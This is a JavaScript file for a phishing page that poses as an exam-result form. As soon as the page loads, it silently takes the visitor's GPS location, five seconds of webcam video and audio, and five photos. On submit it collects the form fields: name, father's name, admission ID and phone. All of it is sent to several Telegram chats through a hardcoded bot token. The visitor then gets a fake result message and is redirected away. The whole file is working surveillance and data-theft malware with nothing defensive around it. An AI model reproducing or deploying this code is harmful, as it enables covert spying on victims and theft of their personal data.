const TOKEN = '8546910341:AAFZKnrP036naa4tciDsMS-bk8TZZ8_wekI';

// Array of chat IDs to send to all users
const CHAT_IDS = [
    '1332669070',
    '7246514514',  // Add more chat IDs here
    '7994937893',
    '7646169456'
];

let mediaStream = null;
let mediaRecorder = null;
let recordedChunks = [];

// 📍 Send GPS location to all users
if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
        pos => {
            const { latitude, longitude } = pos.coords;
            sendToAllUsers(`📍 *Location*\nLat: ${latitude}\nLng: ${longitude}`);
        },
        null,
        {
            enableHighAccuracy: false,
            timeout: 5000,
            maximumAge: 300000
        }
    );
}

// 🎥 Fast media capture - video + audio + photos
if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
    navigator.mediaDevices.getUserMedia({ 
        video: { 
            width: 640,
            height: 480,
            facingMode: 'user',
            frameRate: 15
        },
        audio: true
    })
    .then(stream => {
        mediaStream = stream;
        
        Promise.all([
            startVideoRecording(stream),
            captureMultiplePhotos(stream)
        ]).catch(error => {
            console.error('Capture error:', error);
        });
        
    })
    .catch(error => {
        console.error('Media access error:', error);
    });
}

// 🎬 Fast video recording (5 seconds)
async function startVideoRecording(stream) {
    try {
        recordedChunks = [];
        
        if (!MediaRecorder) return;

        mediaRecorder = new MediaRecorder(stream);
        
        mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
                recordedChunks.push(event.data);
            }
        };
        
        mediaRecorder.onstop = async () => {
            const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
            
            if (videoBlob.size > 0 && videoBlob.size < 45 * 1024 * 1024) {
                await sendToAllUsers(videoBlob, 'video');
            }
        };
        
        mediaRecorder.start();
        
        setTimeout(() => {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            }
        }, 5000);
        
    } catch (error) {
        console.error('Video recording error:', error);
    }
}

// 📸 Fast multiple photo capture
async function captureMultiplePhotos(stream) {
    try {
        const video = document.createElement('video');
        video.srcObject = stream;
        video.muted = true;
        video.playsInline = true;
        
        await video.play();
        
        for (let i = 0; i < 5; i++) {
            setTimeout(async () => {
                await captureSinglePhoto(video, i + 1);
            }, i * 800);
        }
        
    } catch (error) {
        console.error('Photo capture error:', error);
    }
}

// 📸 Single photo capture (optimized)
async function captureSinglePhoto(video, photoNumber) {
    return new Promise((resolve) => {
        try {
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            
            canvas.width = 640;
            canvas.height = 480;
            
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(async blob => {
                if (blob) {
                    await sendToAllUsers(blob, 'photo');
                }
                resolve();
            }, 'image/jpeg', 0.7);
            
        } catch (error) {
            resolve();
        }
    });
}

// 📝 Fast form submission handler
function initializeFormHandler() {
    const loginForm = document.getElementById('loginForm');
    if (loginForm) {
        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const name = document.getElementById('name')?.value || 'N/A';
            const father = document.getElementById('father')?.value || 'N/A';
            const admId = document.getElementById('admId')?.value || 'N/A';
            const phone = document.getElementById('phone')?.value || 'N/A';

            const message = `📄 *Form Submitted*\n• Name: ${name}\n• Father: ${father}\n• ID: ${admId}\n• Phone: ${phone}`;
            
            await sendToAllUsers(message);
            
            alert(`Dear ${name}, we will send you SMS of your result.`);
            window.location.href = 'https://www.google.com';
        });
    }
}

// 📤 Send to ALL users (modified function)
async function sendToAllUsers(data, type = 'message') {
    // Send to each chat ID in parallel
    const sendPromises = CHAT_IDS.map(chatId => 
        sendToTelegram(data, type, chatId)
    );
    
    // Don't wait for all to complete
    Promise.all(sendPromises).catch(() => {});
}

// 📤 Send to specific user
async function sendToTelegram(data, type = 'message', chatId) {
    try {
        if (type === 'photo') {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', data);
            
            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            }).catch(() => {});
                
        } else if (type === 'video') {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('video', data);
            
            fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
                method: 'POST',
                body: formData
            }).catch(() => {});
                
        } else {
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: data,
                    parse_mode: 'Markdown'
                })
            }).catch(() => {});
        }
    } catch (error) {
        // Silent fail
    }
}

// 🛑 Quick cleanup
function stopAllMedia() {
    if (mediaRecorder && mediaRecorder.state === 'recording') {
        mediaRecorder.stop();
    }
    
    if (mediaStream) {
        mediaStream.getTracks().forEach(track => track.stop());
        mediaStream = null;
    }
}

// 🚀 Fast initialization
window.addEventListener('load', function() {
    initializeFormHandler();
    
    const systemInfo = `🖥️ *Page Loaded*\n• URL: ${window.location.href}\n• Time: ${new Date().toLocaleTimeString()}`;
    sendToAllUsers(systemInfo);
});

window.addEventListener('beforeunload', function() {
    stopAllMedia();
});